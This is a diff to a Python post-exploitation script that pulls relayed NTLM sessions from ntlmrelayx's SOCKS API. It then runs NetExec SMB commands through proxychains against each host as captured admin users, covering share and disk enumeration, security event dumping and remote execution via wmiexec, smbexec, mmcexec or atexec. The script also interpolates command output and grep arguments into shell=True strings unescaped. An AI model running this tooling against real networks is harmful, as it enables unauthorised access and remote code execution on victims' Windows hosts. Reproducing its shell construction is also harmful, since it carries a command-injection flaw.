@@ -66,16 +66,35 @@ def parse_cache(cache_file):
     with open(cache_file, 'r') as file:
         for line in file:
             if line.startswith("Action:"):
-                action, ip = line.strip().split(": ")[1].split(" on ")
-                cache_ips.add(ip)
-                cache_actions[action].add(ip)
+                try:
+                    action_ip_part = line.strip().split(": ", 1)[1]
+                    action, ip = action_ip_part.rsplit(" on ", 1)  # Use rsplit to only split once from the right
+                    cache_ips.add(ip)
+                    cache_actions[action].add(ip)
+                except ValueError:
+                    # Optionally, you can suppress this warning
+                    # print(f"Warning: Skipping malformed line in cache file: {line.strip()}")
+                    continue
     return cache_ips, cache_actions
 
 # Function to save action and IPs to the cache file
-def update_cache(cache_file, action, ips):
+def update_cache(cache_file, action_name, ips):
     with open(cache_file, 'a') as file:
         for ip in ips:
-            file.write(f"Action: {action} on {ip}\n")
+            entry = f"Action: {action_name} on {ip}\n"
+            print(f"Writing to cache: {entry.strip()}")  # Debugging print
+            file.write(entry)
+
+# Function to update cache status and re-check after action
+def update_cache_status(cache_file, action_name, available_ips):
+    cache_ips, cache_actions = parse_cache(cache_file)  # Re-read cache to ensure it's up to date
+
+    completed = cache_actions.get(action_name)
+    if completed is None:
+        completed = set()  # Initialize as an empty set if None
+
+    if len(completed) == len(available_ips):
+        cache_actions[action_name] = available_ips  # Mark as complete
 
 # Function to get the user input for selecting systems
 def select_systems(available_ips):
@@ -93,7 +112,7 @@ def select_systems(available_ips):
             print("No valid IPs entered. Please try again.")
 
 # Function to handle the execution of commands
-def execute_command(ip, domain_user, action_name, output_file, exec_method=None, grep=None):
+def execute_command(ip, domain_user, action_name, output_file, cache_file, available_ips, exec_method=None, grep=None, grep_before=0, grep_after=0):
     domain, user = domain_user.split('/')
     base_command = f"proxychains4 -q nxc smb {ip} -d {domain} -u {user} -p ''"
     if exec_method:
@@ -108,8 +127,6 @@ def execute_command(ip, domain_user, action_name, output_file, exec_method=None,
         command = f"{base_command} --shares"
     elif action_name == "Logical drives":
         command = f"{base_command} --disks"
-        # Alternative command commented out for reference
-        # alternative_command = f"{base_command} -x 'wmic logicaldisk get caption'"
     elif action_name == "List security events":
         event_count = input("Default event count is 20. Press Enter to use the default or enter a number to change: ").strip()
         if not event_count.isdigit():
@@ -121,12 +138,17 @@ def execute_command(ip, domain_user, action_name, output_file, exec_method=None,
     print(f"\033[1m[ EXECUTING ] {command}\033[0m")
 
     try:
-        # Preserve color output by setting 'PYTHONIOENCODING' to 'utf-8' and using subprocess to pass the command
         result = subprocess.run(command, shell=True, text=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output = result.stdout + result.stderr
 
         if grep:
-            output = subprocess.run(f"echo \"{output}\" | grep {grep}", shell=True, capture_output=True, text=True).stdout
+            grep_command = f"grep \"{grep}\""
+            if grep_before > 0:
+                grep_command += f" -B {grep_before}"
+            if grep_after > 0:
+                grep_command += f" -A {grep_after}"
+            
+            output = subprocess.run(f"echo \"{output}\" | {grep_command}", shell=True, capture_output=True, text=True).stdout
 
         if output_file:
             with open(output_file, 'a') as f:
@@ -137,15 +159,7 @@ def execute_command(ip, domain_user, action_name, output_file, exec_method=None,
         print(f"Command failed: {e}")
 
     # Re-check cache and actions status immediately after execution
-    update_cache_status(cache_file)
-
-# Function to update cache status and re-check after action
-def update_cache_status(cache_file):
-    cache_ips, cache_actions = parse_cache(cache_file)  # Re-read cache to ensure it's up to date
-
-    completed = set(cache_actions.get(action_name, []))
-    if len(completed) == len(available_ips):
-        cache_actions[action_name] = available_ips  # Mark as complete
+    update_cache_status(cache_file, action_name, available_ips)
 
 # Function to display the main menu
 def display_menu(title, options, cache_actions, available_ips, back_option=True):
@@ -201,7 +215,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
         ]
     }
     
-    available_ips = set(entry[1] for entry in true_lines if entry[3] == 'TRUE')
+    available_ips = set(entry[1] for entry in true_lines if entry[3] == 'TRUE')  # Ensure available_ips is properly initialized
     display_menu(category, options[category], cache_actions, available_ips)
 
     selection = input("> ").strip().lower()
@@ -242,7 +256,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                         break
                 
                 if first_admin_user:
-                    execute_command(first_ip, first_admin_user, action_name, args.output_file, args.exec_method, args.grep)
+                    execute_command(first_ip, first_admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
                     update_cache(cache_file, action_name, [first_ip])
                 else:
                     print(f"No known admin user found for {first_ip}. Skipping.")
@@ -261,7 +275,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                             admin_user = entry[2]
                             break
                     if admin_user:
-                        execute_command(ip, admin_user, action_name, args.output_file, args.exec_method, args.grep)
+                        execute_command(ip, admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
                         update_cache(cache_file, action_name, [ip])
                     else:
                         print(f"No known admin user found for {ip}. Skipping.")
@@ -279,7 +293,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                             break
                     
                     if first_admin_user:
-                        execute_command(first_ip, first_admin_user, action_name, args.output_file, args.exec_method, args.grep)
+                        execute_command(first_ip, first_admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
                         update_cache(cache_file, action_name, [first_ip])
                     else:
                         print(f"No known admin user found for {first_ip}. Skipping.")
@@ -298,7 +312,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                                 admin_user = entry[2]
                                 break
                         if admin_user:
-                            execute_command(ip, admin_user, action_name, args.output_file, args.exec_method, args.grep)
+                            execute_command(ip, admin_user, action_name, args.output_file, cache_file, available_ips, args.exec_method, args.grep, args.grep_before, args.grep_after)
                             update_cache(cache_file, action_name, [ip])
                         else:
                             print(f"No known admin user found for {ip}. Skipping.")
@@ -306,7 +320,7 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
                     return
 
             # Re-check cache and actions status
-            update_cache_status(cache_file)
+            update_cache_status(cache_file, action_name, available_ips)
 
             # Fresh pull from API to check for new systems/users
             fresh_data = fetch_data_from_api(f"http://127.0.0.1:{args.port}/ntlmrelayx/api/v1.0/relays")
@@ -334,9 +348,18 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
 
 def main():
     parser = argparse.ArgumentParser(description="Process ntlmrelayx socks output.")
+    
+    # Add the original --grep argument
+    parser.add_argument("--grep", help="Grep the output of commands.", default=None)
+    
+    # Add the --grep-before and -B alias
+    parser.add_argument("--grep-before", "-B", type=int, help="Number of lines to show before the matching line (alias: -B).", default=0)
+    
+    # Add the --grep-after and -A alias
+    parser.add_argument("--grep-after", "-A", type=int, help="Number of lines to show after the matching line (alias: -A).", default=0)
+    
     parser.add_argument("--input_file", help="Path to the input text file (optional).")
     parser.add_argument("--output_file", help="Path to the output file (optional). If not provided, output will be printed to screen.")
-    parser.add_argument("--grep", help="Grep the output of commands.", default=None)
     parser.add_argument("--no-cache", action="store_true", help="Run without using the cache file.")
     parser.add_argument("--port", type=int, default=9090, help="Port for ntlmrelayx HTTPAPI (default: 9090).")
     parser.add_argument("--exec_method", choices=["wmiexec", "smbexec", "mmcexec", "atexec"], help="Specify the exec-method to use.")
